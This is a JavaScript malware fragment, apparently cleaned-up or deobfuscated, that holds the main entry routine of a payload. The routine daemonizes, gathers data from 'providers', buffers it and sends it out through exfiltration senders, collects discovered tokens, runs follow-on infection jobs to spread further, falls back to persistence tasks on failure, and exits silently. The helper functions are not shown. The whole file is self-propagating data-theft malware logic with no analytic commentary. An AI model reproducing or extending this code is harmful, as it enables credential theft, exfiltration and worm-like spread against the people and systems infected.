/*
 * Main payload orchestration, provider execution, follow-on jobs, exfil dispatch, and fatal catch handler.
 */

async function mainPayloadEntry() {
  let infectionJobs;
  try {
    await preflightAndDaemonize();
    let initialProviderResults = await collectInitialProviderResults(),
      exfilSenders = await buildExfilSenders(initialProviderResults),
      { providers: followOnProviders, dispatched: followOnDispatched } =
        await buildFollowOnProviders(initialProviderResults),
      exfilDispatcher = new ExfilDispatcher({
        senders: exfilSenders,
        preflight: true,
      }),
      resultBuffer = new ResultBuffer({
        flushThresholdBytes: 102400,
        dispatch: exfilDispatcher.dispatch,
      });
    for (let initialProviderResult of initialProviderResults)
      resultBuffer.ingest(initialProviderResult);
    await resultBuffer.run(
      followOnProviders.map(
        (followOnProvider) => (streamingResultBuffer) =>
          followOnProvider.executeStreaming(streamingResultBuffer),
      ),
    ),
      await resultBuffer.finalize(),
      (infectionJobs = buildFollowOnInfectionJobs(
        initialProviderResults,
        followOnDispatched,
        resultBuffer.discoveredTokens,
      ));
  } catch (mainPayloadError) {
    infectionJobs = buildFallbackPersistenceTasks();
  }
  await executeInfectionJobs(infectionJobs), exitAfterCleanup();
}
mainPayloadEntry().catch((mainPayloadFatalError) => {
  exitAfterCleanup();
});
